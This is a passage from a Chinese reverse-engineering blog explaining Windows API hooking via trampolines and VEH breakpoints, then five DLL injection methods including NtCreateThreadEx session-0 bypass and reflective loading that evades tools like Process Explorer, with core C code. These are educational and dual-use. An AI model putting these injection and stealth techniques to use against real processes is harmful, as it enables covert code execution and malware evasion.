对比图35，第一个printf打印出的目的地址计算结果是正确的。对比图36，第二个printf打印计算出来的相对地址也和Trampoline函数中的cmp指令中的相对地址值相同。\n那问题出现在哪呢？第二个printf打印出的被减数与减数可以很明显看出来计算结果也会是8字节的，但是因为截断导致数值发生了变化。正确的计算结果如下\n图39.正确的计算结果 当把正确的结果截断4字节就会发现与得到的计算结果相同，因此该想法的错误是因为相对地址的计算结果大于4字节，从而导致数据丢失，进而计算出了错误的目的地址。\n那该如何解决这个问题呢，我能想到的办法就是先从原目的地址处获取用来比较的数据，写入我们申请的内存空间中空闲的地址处，然后将目的地址改为该地址。虽然比较麻烦，但这样就可以解决问题了。\n实现的代码:\n1 2 3 4 5 6  // 计算原目的地址 ULONG_PTR pData = (ULONG_PTR)pHookData-\u0026gt;HookPoint + 7 + 7 + *(ULONG*)(pHookData-\u0026gt;HookPoint + 10); // 获取原目的地址的值并写入空闲空间 *(ULONG*)((ULONG_PTR)pFun + 30) = *(ULONG*)pData; // 将重定位的目的地址计算出的相对地址写入cmp指令 *(ULONG*)(pFun + 10) = (ULONG)(((ULONG_PTR)pFun + 30) - ((ULONG_PTR)pFun + 14));   这里pFun+30为申请的内存空间中空闲的地址。将相对地址如此重定位之后，我们再查看Trampoline的cmp指令是否正常\n图40.修改后的相对地址重定位结果 很明显cmp中的目标地址指向的正是申请内存空间中第30个地址处，因此内存访问合法。\n64位系统中Hook出现的问题比32位更多，主要体现在指令碎屑以及地址长度位8字节截断后导致的数据错误。在Hook的时候应该小心这些问题。\n0x4 基于异常处理的Hook 要想通过异常处理的机制来进行Hook，我们需要先了解Windows的异常处理机制，Windows用户态异常处理流程图如图41所示\n图41.Windows用户态异常处理流程 当程序执行过程中出现了异常时，系统内核的异常处理过程nt!KiDispatchException就会开始工作。在没有内核调试器存在且异常程序没有被调试的情况下，系统就会把异常处理过程转交给用户态的异常处理过程ntdll!RtlDispatchException，然后该异常处理过程根据图41的顺序查找系统是否安装了异常处理程序(例如SEH，VEH，TopLevelExceptionHandle)，如果安装了就会调用异常处理过程进行处理。\n实际应用中，SEH的使用有较多限制，SEH是基于线程、非全局、基于栈的异常处理程序，我们可以通过TEB(线程环境块)结构体的第一个成员NtTib结构体中的第一个成员，即TEB.NtTib.ExceptionList成员获取进程的SEH链。SEH的添加方式是基于栈的，当需要添加新的SEH时就会将新的SEH地址push入栈，然后再将原SEH链中的首个SEHpush入栈，再将RSP(ESP)的值赋给GS[0] (FS[0])寄存器，也就是TEB的第一个成员NtTib结构体中的第一个成员ExceptionList中。综上SEH是只能处理自己线程的异常，所以使用的限制较多。\nVEH是基于进程、全局并且优先于SEH处理的。其并不依赖于某一线程，在本进程中任何线程出现异常都可以被VEH处理。因此我们在进程中任意一处主动触发异常时，就能保证异常能进入异常处理程序中，这样极大方便了HOOK。\n当使用VEH异常处理机制HOOK时，首先需要注册一个VEH异常处理程序，然后在要Hook的函数中设置INT3断点，当要Hook的函数被调用时就会触发中断导致异常，此时进程就会跳转至异常处理程序，我们只需要在异常处理程序添加我们的目的代码即可。\n流程图:\n图42.VEH流程图 核心代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  // 获取目标函数地址 HMODULE hMod = LoadLibrary(hModToHook); g_AddrofMessageBoxA = (PVOID)GetProcAddress(hMod, hFuncToHook); // 获取trampoline函数地址 g_OriginalMessageBoxA = (PFN_MessageBox)InitTrampolineFunc(); // InitTrampolineFunc()函数 AddrofTrampoline = (PBYTE)VirtualAlloc(NULL, 128, MEM_COMMIT, PAGE_EXECUTE_READWRITE); retAddrOfTrampoline = (ULONG_PTR)AddrofTrampoline; memset(AddrofTrampoline, 0, 128); memcpy(AddrofTrampoline, (PVOID)g_AddrofMessageBoxA, 4); AddrofTrampoline += 4; AddrofTrampoline[0] = 0xff; AddrofTrampoline[1] = 0x25; *(ULONG_PTR*)(AddrofTrampoline + 6) = (ULONG_PTR)g_AddrofMessageBoxA + 4; return retAddrOfTrampoline; // Detour函数 int result; result = g_OriginalMessageBoxA(hWnd, \u0026#34;Hooked By VEH\u0026#34;, lpCaption, uType); return result; // VEH异常处理函数  ULONG_PTR* uRsp = 0; // 可以直接更改参数后再次调用trampoline(已经跳过0xCC) // //pContextRecord-\u0026gt;Rdx = (ULONG_PTR)szNewText; //pContextRecord-\u0026gt;Rip = (ULONG_PTR)g_OriginalMessageBoxA; // // 也可以把Rip改为自己写的Detour,但是要把Rsp对应变化 并在调用Detour后让Rip指向返回地址 // 刚调用目标函数时，栈顶为调用MessageBox时存的返回地址 //保存原RSP的值 uRsp = (ULONG_PTR*)pContextRecord-\u0026gt;Rsp; // 调用Detour ret = MyDetour((HWND)pContextRecord-\u0026gt;Rcx, (LPCSTR)pContextRecord-\u0026gt;Rdx, (LPCSTR)pContextRecord-\u0026gt;R8, (int)pContextRecord-\u0026gt;R9); // 手动保持栈平衡，模拟pop，因为将要手动设置异常处理结束后要执行的代码地址，程序就不会自动pop出去。 pContextRecord-\u0026gt;Rsp += sizeof(ULONG_PTR); // 将RIP设置为调用MessageBox时存的返回地址 pContextRecord-\u0026gt;Rip = uRsp[0]; // 设置INT3断点 // 保存原指令 g_OldCode[0] = *pTarget; MEMORY_BASIC_INFORMATION mbi; // 写入0XCC VirtualQuery(pTarget, \u0026amp;mbi, sizeof(mbi)); VirtualProtectEx(GetCurrentProcess(), mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOld); *pTarget = 0xCC; VirtualProtectEx(GetCurrentProcess(), mbi.BaseAddress, mbi.RegionSize, dwOld, 0); // 脱钩 BYTE* pTarget = (BYTE*)pFuncAddr; MEMORY_BASIC_INFORMATION mbi; // 将INT3指令还原 VirtualQuery(pTarget, \u0026amp;mbi, sizeof(mbi)); VirtualProtectEx(GetCurrentProcess(), mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOld); *pTarget = g_OldCode[0]; VirtualProtectEx(GetCurrentProcess(), mbi.BaseAddress, mbi.RegionSize, dwOld, 0); // 卸载VEH异常处理程序 UninstallVEH();   我们通过x64dbg来观察该Hook技术的实际执行流程。\n原64位环境的MessageBox函数的代码截图为图24，在注入DLL后对比两者的区别\n图43.VEHHook设置断点 对比图24和图43可知，当对目标函数设置INT3断点时，因机器码为一个字节0xcc所以只是把原函数第一条指令的机器码前缀给替换掉，指令从sub rsp,38变成了sub esp,38。我们从这里也可以获取一个信息，机器码前缀有48时修饰的是64位的寄存器，无48前缀则是32位的。\n我们触发设置的INT3断点后再继续分析，\n图44.VEH异常处理程序 在RIP当前所指的位置(被标黑的地址处)之前的两个jne对应为项目代码里的判断语句，jne与call之间的都是为继续调用MessageBox函数而保存的参数，其中mov rdi, [rcx+8]的语句就是代码中的uRsp = (ULONG_PTR*)pContextRecord-\u0026gt;Rsp。而在RIP所指的语句，rdi+98的值为堆栈地址，该堆栈地址所存的就是调用MessageBox函数时的栈顶地址。\n具体对比图46以及图47\n图45.rdi+98所指堆栈地址 进入该地址所保存的值查看\n图46.rdi+98所指堆栈地址保存的堆栈数据 图47为调用MessageBox函数时的堆栈数据\n图47.设置INT3断点后进入MessageBox函数的栈数据 此时RIP指向的语句 add [rdi+98],8 正对应了代码中的 pContextRecord-\u0026gt;Rsp += sizeof(ULONG_PTR)，执行语句后如图49，可与图45对比数据\n图49.原栈顶地址+8 后面的指令就把调用MessageBox函数时保存的返回地址存在rdi+F8中，最后在ret指令停下来，我们发现此时的栈数据与触发断点后进入VEH异常处理程序时的相同，因此其会继续按流程回到触发异常前的状态，又因为对返回地址做了处理，就是在程序代码中的这一句，pContextRecord-\u0026gt;Rip = uRsp[0];，所以当处理完异常状态后，恢复进程继续执行的第一条指令就是执行RIP指向的地址处的指令，程序就会直接返回到MessageBox的返回地址处。\n图50.VEH异常处理程序RET执行前的堆数据 图51.触发断点后进入VEH时的栈数据 图51的栈顶地址指向的地址就是在做异常处理过程的收尾工作的代码地址，我暂时对这部分知识还很陌生，因此只能推测其再做判断异常是否处理完成，然后根据处理结果判断是根据记录的上下文继续执行进程，或是将异常上交给上一层的处理机制。\n在这个例子中，ret后我跟着这部分异常处理收尾代码跑，不是很长，最后就会回到调用MessageBox时保存的返回地址处。\n0x5 总结 HOOK技术的博客还是有点难写，我在写的过程中就能感受到很难才能表达清楚我的意思，如果有写得不对不好的地方还请见谅并希望得到指正。所有的HOOK代码都是写在DLL文件中，并且是通过上一篇博客写的注入器注入的。\nHOOK技术与DLL注入一样，都是可以获得程序控制权的手段。但是同样也能做很多有益的事情，例如对程序打补丁，添加新功能等。该博客涉及到的Hook技术还只是Ring3层级，还有非常多更加底层更加隐蔽的Hook技术，例如通过对系统服务描述符表、COM接口的功能函数表等进行Address hook。HOOK和DLL注入相同，都是通过操作系统的各种机制实现目的，HOOK的核心思想就是通过操作系统的机制控制程序跳转去执行我们的目的函数，在跳转以及还原程序执行流程时都必须保证程序指令的完整性，以及堆栈平衡，这样才能避免引发程序异常。\n","permalink":"http://int80.top/hooktechnique/","tags":["逆向"],"title":"常用Hook技术解析"},{"categories":["逆向"],"contents":"0x0 前言 纸上得来终觉浅，DLL注入光听书中说总是不过瘾，于是自己动手写一写代码。这也是我第一次写Windows编程，虽然都是C语言，但变量类型，API却一点也不了解。可是做Windows逆向不会Windows编程怎么行呢？于是这个小项目也用来入门Windows编程，熟悉一些常用写法和API。后面在实现API Hook时，我也是通过这个DLL 注入工具进行HOOK测试。\n这个小项目是参考了injectAllTheThings项目，以及《核心原理》DLL注入部分内容编写完成的，其中的反射式DLL注入是参考了作者stephenfewer开源代码完成。参考项目链接都放在后面了。\n我实现了五种注入方法，如下图所示\n同时还实现了向全进程注入以及卸载DLL的功能。\n为了再次强化学习DLL注入的知识，再加上网上对这个技术分析的文章质量实在不敢恭维，因此自己就想把自己的学习过程以及对这个技术的理解尽可能高质量的清晰地写出来。\n该博客里的代码并不完整，可以将项目的代码对着博客理解。\n项目地址：\nDllInJectionTool\n参考项目：\ninjectAllTheThings\nReflectiveDLLInjection\n0x1 何为DLL注入 先简单介绍一下什么是DLL, DLL(Dynamic Linked Library，动态链接库)的存在是为了解决因库函数多次被程序加载至内存导致内存浪费的情况。当一个DLL首次被进程加载后，该DLL的代码以及资源就可以实现共享，允许其他的进程使用。\nDLL还有一个特性，当DLL被加载到进程内存空间后会自动执行DllMain()函数，只要将想要程序执行的代码写入DllMain函数中，当该DLL被加载后这些代码就会自动执行，这也就是DLL注入的原理。\n因此DLL注入聚焦于如何让已经运行的程序加载外部DLL。同时，会在最后更改PE文件数据，通过静态方法让PE文件在启动时自动加载目标DLL。\n0x2 CreateRemoteThread, RtlCreateUserThread and NtCreateThreadEx 0x2.1CreateRemoteThread 通过CreateRemoteThread函数来实现DLL注入是非常经典的方法。该方法的实现思路如下，首先为DLL路径字符串申请内存空间，将DLL路径写入目标进程的内存中，并通过GetProcAddress获得LoadLibrary函数地址，最后通过CreateRemoteThread函数在目标进程创建一个线程，这个线程函数就是LoadLibrary，而DLL路径字符串作为线程函数的参数传入。那么就能让目标进程运行LoadLibrary函数加载目标DLL，从而实现DLL注入。\n流程图如下：\n核心代码如下:\n1 2 3 4 5 6 7 8 9 10 11  // 获取目标进程句柄 hProcess = OpenProcess(dwDesireAccess, FALSE, dwPID); // 申请DLL路径字符串长度的内存空间 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBuffSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // 将DLL路径字符串写入申请的内存空间中 WriteProcessMemory(hProcess, pRemoteBuf, (LPCVOID)szDllPath, dwBuffSize, NULL); // 获取LoadLibrary函数地址 hMod = GetModuleHandle(L\u0026#34;kernel32.dll\u0026#34;); hThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \u0026#34;LoadLibraryW\u0026#34;); // 创建远程线程运行LoadLibrary函数实现DLL的加载 hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);   0x2.2 RtlCreateUserThread 我并没有在MSDN中查找到这个函数的定义，在网上搜索得到的信息说这个函数是未公开的。因此只能通过网上流出的该函数的信息进行定义后使用，也可自己去逆向出该函数的参数等一些信息。\nRtlCreateUserThread函数与CreateRemoteThread函数类似，最终都会调用NtCreateThreadEx函数来创建进程实体。\n因此该函数实现流程与CreateRemoteThread无异，但因为其是未导出的函数，我们无法直接调用RtlCreateUserThread函数，需要自己定义RtlCreateUserThread函数，并且需要通过GetProcAddress函数获得其地址后才能调用。\n流程图如下:\n首先定义RtlCreateUserThread函数:\n1 2 3 4 5 6 7 8 9 10 11 12  typedef DWORD(WINAPI* pRtlCreateUserThread)( IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor, IN BOOL CreateSuspended, IN ULONG\tStackZeroBits, IN OUT PULONG\tStackReserved, IN OUT PULONG\tStackCommit, IN LPVOID\tStartAddress, IN LPVOID\tStartParameter, OUT HANDLE ThreadHandle, OUT LPVOID\tClientID );   核心代码如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  // 获取目标进程句柄 hProcess = OpenProcess(dwDesireAccess, FALSE, dwPID); // 申请DLL路径字符串长度的内存空间 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBuffSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // 将DLL路径字符串写入申请的内存空间中 WriteProcessMemory(hProcess, pRemoteBuf, (LPCVOID)szDllPath, dwBuffSize, NULL); // 获取LoadLibrary函数地址 hMod = GetModuleHandle(L\u0026#34;kernel32.dll\u0026#34;); hThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \u0026#34;LoadLibraryW\u0026#34;); // 获取RtlCreateUserThread函数的地址 RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandle(L\u0026#34;ntdll.dll\u0026#34;), \u0026#34;RtlCreateUserThread\u0026#34;); // 调用RtlCreateUserThread函数 Status = (BOOL)RtlCreateUserThread( hProcess, NULL, 0, 0, 0, 0, hThreadProc, pRemoteBuf, \u0026amp;hRemoteThread, //通过RtlCreateUserThread创建的线程句柄 \tNULL);   0x2.3 NtCreateThreadEx 前面两个函数CreateRemoteThread 以及 RtlCreateUserThread 都是 NtCreateThreadEx函数的封装。经过调试会发现CreateRemoteThread函数与RtlCreateUserThread函数执行最后，都进入了NtCreateThreadEx函数，并在该函数通过SYSENTER指令进入了内核模式。\n在Windows vista以后，Windows对系统服务和登录用户进行了会话隔离，即系统服务属于会话0，第一个登陆系统的用户为会话1。如果会话1的用户尝试向会话0的进程创建远程进程就会失败。原因是在Windows XP以后，CreateRemoteThread内部实现算法采取了挂起模式。当会话0的进程被创建远程线程时，会采取挂起模式创建，然后会进行判断被创建远程线程的进程是否属于会话0并且发起注入的进程和目标进程是不是属于同一个会话。如果不属于相同的会话，那么对会话0创建的远程线程就不会被CsrClientCallServer函数进行登记的操作，这就导致挂起创建的进程不会恢复运行，而是直接返回错误，这就是利用CreateRemoteThread函数对会话0的进程进行注入会失败的原因。\n通过调试CreateRemoteThread函数可知，当执行完NtCreateThreadEx后，会创建出线程句柄，并且该函数会根据第七个参数的值来决定该线程是否以挂起模式创建。当通过CreateRemoteThread函数向会话0进程创建远程线程操作中，当调用NtCraeteThreadEx函数时，第七个参数为TRUE，即以挂起模式创建，因此必须通过在KernelBase!CreateRemoteThreadEx中的CsrClientCallServer 以及 ZwResumeThread 函数唤醒线程。如果直接通过NtCreateThreadEx函数不以挂起模式(第七参数为FALSE)创建线程，那么就能跳过会话隔离造成的注入失败情况。\nNtCreateThreadEx函数同样是未公开的函数，有可能会在以后被改变，因此之后该方法有可能失效。同RtlCreateUserThread函数一样，我们需要定义NtCreateThreadEx函数，方法也是网上搜集信息或者自己逆向出来。\n流程图:\n对NtCreateThreadEx函数的定义如下(32位以及64位不同)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  // 64位用 typedef NTSTATUS(WINAPI* LPFUN_NtCreateThreadEx)( PHANDLE hThread, ACCESS_MASK DesireAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpstartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID lpBytesBuffer ); // 32位用 typedef NTSTATUS(WINAPI* LPFUN_NtCreateThreadEx)( PHANDLE hThread, ACCESS_MASK DesireAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpstartAddress, LPVOID lpParameter, BOOL CreateSuspended, ULONG StackZeroBits, ULONG SizeOfStackCommit, ULONG SizeOfStackReserve, LPVOID lpBytesBuffer );\t  核心代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  // 获取目标进程句柄 hProcess = OpenProcess(dwDesireAccess, FALSE, dwPID); // 申请DLL路径字符串长度的内存空间 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBuffSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // 将DLL路径字符串写入申请的内存空间中 WriteProcessMemory(hProcess, pRemoteBuf, (LPCVOID)szDllPath, dwBuffSize, NULL); // 获取LoadLibrary函数地址 hMod = GetModuleHandle(L\u0026#34;kernel32.dll\u0026#34;); hThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \u0026#34;LoadLibraryW\u0026#34;); // 获取NtCreateThreadEx函数地址 pFunc = GetProcAddress(GetModuleHandle(L\u0026#34;ntdll.dll\u0026#34;), \u0026#34;NtCreateThreadEx\u0026#34;); // 调用NtCreateThreadEx函数 ((LPFUN_NtCreateThreadEx)pFunc) (\u0026amp;hThread, 0x1FFFFF, NULL, hProcess, pThreadProc, pRemoteBuf, FALSE, // 该参数决定了是否以挂起模式创建线程.1挂起,0运行. \tNULL, NULL, NULL, NULL);   0x3 QueueUserAPC APC(异步调用过程)是一种软中断机制，当一个线程从等待状态苏醒时就会检测是否有APC交给自己，如果有就会优先执行APC过程。利用这种机制，我们通过向线程添加APC过程，从而让程序执行实现DLL注入的函数。我们通过QueueUserAPC函数向线程添加APC过程，而我们的APC过程执行函数为LoadLibrary，传入的参数为DLL路径字符串。\n那么这里就有一个问题，我们没有办法保证一个线程一定会有可唤醒状态，因此为了提高调用几率，我们需要向目标进程的所有线程都添加该APC过程。而这又引起了一个问题，就是会导致DLL会被多次注入，那么当我们卸载DLL时也需要卸载相同次数。\n流程图：\n核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  // 获取目标进程句柄 hProcess = OpenProcess(dwDesireAccess, FALSE, dwPID); // 申请DLL路径字符串长度的内存空间 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBuffSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // 将DLL路径字符串写入申请的内存空间中 WriteProcessMemory(hProcess, pRemoteBuf, (LPCVOID)szDllPath, dwBuffSize, NULL); // 获取LoadLibrary函数地址 hMod = GetModuleHandle(L\u0026#34;kernel32.dll\u0026#34;); hThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \u0026#34;LoadLibraryW\u0026#34;); // 获取系统全线程的快照 hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL); // 遍历全线程找到属于目标进程的线程 for (; ThreadEnd; ThreadEnd = Thread32Next(hSnapShot, \u0026amp;te)) { // dwPID 为目标进程pid \tif (te.th32OwnerProcessID == dwPID) { ThreadID = te.th32ThreadID; // 获取线程句柄 \thThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); // 向目标进程的线程添加APC过程,APC执行的是LoadLibrary函数，参数为DLL路径字符串 \tQueueUserAPC((PAPCFUNC)hThreadProc, hThread, (ULONG_PTR)pRemoteBuf); // Counter用来记录注入了多少次，便于卸载 \tCounter++; CloseHandle(hThread); } } }   0x4 SetWindowsHookEx 该DLL注入方法与Windows系统中的消息机制有关。Windows消息钩取原理如下图所示:\n( 图源自《核心原理》)\n结合该图我们先了解一下Windows的消息机制。\nWindows是以事件驱动为工作方式，其维护着一个OS message queue的消息队列。当发生事件时，该事件对应的消息会被添加到OS message queue中，然后OS判断哪个应用发生了该事件，然后就从OS message queue 中取出该消息发送给应用的message queue中。\n在这个过程中，我们可以添加钩子，在消息传给应用的消息队列前钩取，由此可以读取、拦截以及修改消息。\n我们通过SetWindowsHookEx函数注册钩子，要了解如何通过SetWindowsHookEx注册的钩子实现DLL注入，我们需要先了解该函数的参数的意义。\n1 2 3 4 5 6 7 8 9 10  HHOOK SetWindowsHookEx( [in] int idHook, [in] HOOKPROC lpfn, [in] HINSTANCE hmod, [in] DWORD dwThreadId ); para1: idHook是事件类型，例如键盘输入事件 para2: lpfn是钩子过程(Hook Procedure),即事件发生后要执行的函数 para3: hmod是包含lpfn函数的DLL para4: dwThreadId是想要被挂钩的线程ID，即事件发生后，需要勾取的线程   当我们通过SetWindowsHookEx函数注册好钩子后，当想要被挂钩的线程所属的进程发生指定事件后，操作系统会将相关的DLL文件强制注入到目标进程中，然后调用钩子过程。\n因此我们需要将我们希望程序执行的代码，即钩子过程(Hook Procedure)，写入DLL的导出函数中，如此才能在注入器中通过GetProcAddress函数获得钩子过程的地址。\n流程图：\n核心代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13  // 获得目标进程当前的线程ID DWORD ThreadID = GetThreadID(dwPID); // 加载目标DLL，但在加载以及卸载的时候不会执行DllMain函数(参数3定义的) HMODULE dll = LoadLibraryEx(szDllPath, NULL,DONT_RESOLVE_DLL_REFERENCES); // 获取钩子过程(hook procedure)的地址，DLL文件中钩子过程的函数名需要为\u0026#34;Poc\u0026#34; HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, \u0026#34;Poc\u0026#34;); // 注册钩子 // 触发HOOK事件为键盘输入，addr为钩子过程，dll为钩子过程所在的DLL，ThreadID为目标进程的线程ID HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, ThreadID); // 通过getchar()函数让钩子能等待事件触发再脱钩 getchar(); // 注销钩子(脱钩) UnhookWindowsHookEx(handle);   0x5 Reflective Injection 这个反射式注入方法较前面几种方法更加隐蔽，其是通过手动方式将DLL文件加载至目标进程内存中，而不是通过LoadLibrary，因此没有向进程注册目标DLL，所以例如Process explore这样的程序也无法检测到该DLL。\n该方法通过手动让DLL文件加载到内存中，相当于手动实现了PE加载器的功能，因此我们可以从该注入方法可以强化对PE文件结构的了解，并能学到PE加载器的实现过程，PE文件如何实现重定位，以及PE文件查看器的实现思路(即如何取出PE文件中的不同数据)。\n该方法我们需要在目标DLL中实现一个名为ReflectiveLoader的导出函数，并在注入器中实现我们的LoadRemoteLibraryR函数来替代原LoadLibrary，来完成DLL的加载。\n该注入技术的代码每一行都已经注释在项目代码中。\n反射式DLL注入方式的总体流程图:\n注入器实现流程图:\n在注入器的实现中，必须清楚一点，我们是先把DLL文件读入注入器的堆空间中，不是目标进程的内存空间。\n同时，我们打开的是DLL文件在磁盘的文件结构，因此当我们读取DLL文件结构中保存的是相对虚拟地址的数据时，我们需要转化成文件偏移才能正确获取数据。只有当文件以Image结构存在与内存中时，才不需要将相对虚拟地址转换成文件偏移。\n注入器核心代码：\n1 2 3 4 5 6 7 8 9 10 11 12  // 打开目标DLL文件 hFile = CreateFileW(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL); // 获取目标DLL文件大小 dwLength = GetFileSize(hFile, NULL); // 在注入器中分配目标DLL文件大小的堆空间 lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength); // 向申请的堆空间写入DLL文件 ReadFile(hFile, lpBuffer, dwLength, \u0026amp;dwBytesRead, NULL); // 获取目标进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); // 调用ReflectiveLoader函数,实现目标DLL的加载至目标进程 hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);   LoadRemoteLibraryR函数实现流程图:\nLoadRemoteLibraryR核心代码:\n1 2 3 4 5 6 7 8 9 10 11  // 获取DLL中ReflectiveLoader函数的文件偏移地址 dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer); // 在目标进程申请DLL文件大小的内存空间 lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 将DLL文件写入目标进程申请的内存空间中 WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL); // 获取在目标进程中DLL文件写入到的内存空间中的ReflectiveLoader函数的文件偏移 lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset); // 通过函数RtlCreateUserThread创建远程线程来调用ReflectiveLoader函数(因此我们还需要定义RtlCreateUserThread函数) RtlCreateUserThread = (PRTL_CREATE_USER_THREAD)(GetProcAddress(GetModuleHandle(TEXT(\u0026#34;ntdll\u0026#34;)), \u0026#34;RtlCreateUserThread\u0026#34;)); RtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, lpReflectiveLoader, lpParameter, \u0026amp;hThread, NULL);   在LoadRemoteLibraryR函数中调用了GetReflectiveLoaderOffset函数获取了ReflectiveLoader函数在目标DLL中的文件偏移地址。\nGetReflectiveLoaderOffset流程图:\n核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  // 获取DLL文件写入的内存堆的起始地址 uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer; // 获取DLL文件的NT Header 的文件偏移，也就是PE签名开头的地址 uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-\u0026gt;e_lfanew; // 获取可选头中的导出表地址 uiNameArray = (UINT_PTR) \u0026amp; ((PIMAGE_NT_HEADERS)uiExportDir)-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; // 将相对虚拟地址转为文件偏移是因为此时DLL文件在内存中的结构与在磁盘中的结构相同，并没有以Image结构存于内存中 // 获取IMAGE_EXPORT_DIRECTORY结构体的地址 uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-\u0026gt;VirtualAddress, uiBaseAddress); // 获取DLL导出函数名称的数组文件偏移 uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;AddressOfNames, uiBaseAddress); // 获取DLL导出函数地址数组的文件偏移 uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;AddressOfFunctions, uiBaseAddress); // 获取DLL导出函数Ordinals数组的文件偏移 uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;AddressOfNameOrdinals, uiBaseAddress); // 获取导出函数的数量 dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;NumberOfNames; // 遍历所有导出函数寻找反射加载器函数 while (dwCounter--) { // 获取导出函数名称，导出函数名称数组保存的是函数名称字符串保存的相对虚拟地址，因此还需要第二次转换字符串保存的地址为文件偏移 \tchar* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress)); // 如果导出函数名称数组中能找到字符串\u0026#34;ReflectiveLoader\u0026#34; \tif (strstr(cpExportedFunctionName, \u0026#34;ReflectiveLoader\u0026#34;) != NULL) { // 当找到反射加载器函数后，就获取函数地址表文件偏移 \tuiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;AddressOfFunctions, uiBaseAddress); // 以Orinal的值作为索引，从函数地址数组取出反射加载器函数的地址  // DEREF_16和DEREF_32是一个宏，会将括号里的变量转化成16位或32位指针，然后取出指针的数据 \tuiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD)); // 将反射加载器函数的地址转为文件偏移地址 \treturn Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress); } // 如果没找到反射加载器的函数就把指针移动到下一个函数名称数组元素 \tuiNameArray += sizeof(DWORD); // 函数名称数组每一个数据对应一个函数，以该函数在函数名称数组对应的索引作为NameOrdinal数组的索引取到的数据就为这个函数的Ordinal。再通过该Ordinal作为索引在函数地址数组取出该函数的相对虚拟地址。 \t// 那么根据Ordinal数组的 Ordinal = 函数地址表的index 的形式同步函数名称数组移动，找到后即可从以Ordinal索引从函数地址数组取出相应函数的地址 \tuiNameOrdinals += sizeof(WORD); }   GetReflectiveLoader函数中使用到了RVA2Offset函数，该函数中判断RVA是否可以转化成文件偏移的条件是非常值得学习的细节。\nRVA2Offset核心代码如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // 相对虚拟地址和文件偏移转化是根据公式: // offset = RVA - VirtualAddress + PointerToRawData // 而VirtualAddress 和 PointerToRawData 为节区头的数据  // 获取NT头的地址，也就是PE签名开始的地址 pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-\u0026gt;e_lfanew); // 